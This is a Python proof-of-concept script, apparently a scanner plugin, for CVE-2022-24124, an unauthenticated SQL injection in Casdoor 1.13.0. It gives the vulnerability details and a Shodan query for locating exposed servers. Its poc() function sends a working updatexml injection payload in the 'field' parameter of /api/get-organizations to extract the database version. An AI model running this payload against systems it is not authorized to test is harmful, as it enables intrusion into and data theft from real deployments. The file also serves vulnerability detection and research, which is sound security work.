import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Casdoor 1.13.0 - SQL Injection (Unauthenticated)''',
        "description": '''The query API in Casdoor before 1.13.1 has a SQL injection vulnerability related to the field and value parameters, as demonstrated by api/get-organizations.''',
        "severity": "high",
        "references": [
            "https://www.exploit-db.com/exploits/50792", 
            "https://github.com/cckuailong/reapoc/tree/main/2022/CVE-2022-24124/vultarget", 
            "https://nvd.nist.gov/vuln/detail/CVE-2022-24124"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "7.5",
            "cve-id": "CVE-2022-24124",
            "cwe-id": "CWE-89"
        },
        "metadata":{
            "vuln-target": "https://github.com/cckuailong/reapoc/tree/main/2022/CVE-2022-24124/vultarget",
            "shodan-query":'''http.title:"Casdoor"''',
            "product":'''https://casdoor.org/'''
        },
        "tags": ["casdoor", "sqli", "unauth"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),1)"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',}
        resp = requests.get(url=url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp.status_code == 200 and re.search(r"XPATH syntax error.*&#39", resp.text) and "casdoor" in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url